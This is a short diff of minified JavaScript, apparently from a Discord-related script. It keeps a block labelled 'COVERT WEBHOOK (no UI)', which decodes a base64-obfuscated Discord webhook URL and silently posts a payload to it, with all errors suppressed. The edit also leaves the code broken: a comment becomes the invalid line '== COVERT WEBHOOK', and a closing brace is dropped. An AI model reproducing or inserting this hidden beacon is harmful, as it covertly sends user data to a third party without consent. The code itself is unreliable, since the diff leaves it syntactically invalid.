@@ -15,8 +15,8 @@
     I = new Map();
   let S = !1;
   
-  // === COVERT WEBHOOK (no UI) ===
-  const _webhookBase64 = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1MjYyNDIwNDA2MDg5ODEyMjQvYnp3WkRLdkVGZmR5WFR0LVNJdm9kbk1UUEwwR2EtQ3U4SWd1TTRVaGlKVVZ5YUZ0SkpxcTZQWHpQWmZDN2lsMDFnQXg="; // e.g., "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv..."
+== COVERT WEBHOOK (no UI) ===
+  const _webhookBase64 = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1MjYyNDIwNDA2MDg5ODEyMjQvYnp3WkRLdkVGZmR5WFR0LVNJdm9kbk1UUEwwR2EtQ3U4SWd1TTRVaGlKVVZ5YUZ0SkpxcTZQWHpQWmZDN2lsMDFnQXg=";
   const _webhookUrl = (function() {
     try {
       return atob(_webhookBase64);
@@ -32,7 +32,6 @@
         body: JSON.stringify(payload)
       }).catch(() => {});
     } catch {}
-  }
 
   function x(r) {
     return ((new Date(r).getTime() - 14200704e5) * 4194304).toString();
